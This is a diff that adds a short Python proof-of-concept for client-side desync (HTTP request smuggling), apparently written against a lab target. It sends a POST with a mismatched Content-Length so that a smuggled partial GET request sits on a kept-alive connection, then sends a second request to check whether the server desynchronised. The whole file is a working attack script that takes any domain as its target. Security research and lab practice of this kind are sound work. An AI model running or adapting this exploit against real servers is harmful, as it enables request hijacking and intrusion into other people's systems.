@@ -1,0 +1,27 @@
+#Client Side Desync (HTTP Request Smuggling) by AFK
+#Shoutz @albinowax @portswigger @orange_8361
+
+import http.client
+import pprint
+import sys
+domain = sys.argv[1]
+
+conn = http.client.HTTPSConnection(domain)
+
+headers = {'Connection': 'keep-alive','Content-type': 'application/x-www-form-urlencoded','Content-Length': '1'}
+data = "GET /en/post?postId=8 HTTP/1.1\r\nFoo: x"
+conn.request("POST", "/",data,headers)
+r1 = conn.getresponse()
+print(r1.status, r1.reason)
+data1 = r1.read()
+headers = {'Connection': 'close','Content-type': 'application/x-www-form-urlencoded','Content-Length': '0'}
+data = ""
+conn.request("GET", "/",data,headers)
+r2 = conn.getresponse()
+headers = r2.getheaders()
+pp = pprint.PrettyPrinter(indent=4)
+pp.pprint("Headers: {}".format(headers))
+print(r2.status, r2.reason)
+data2 = r2.read().decode('utf-8')
+print(data2)
+conn.close()
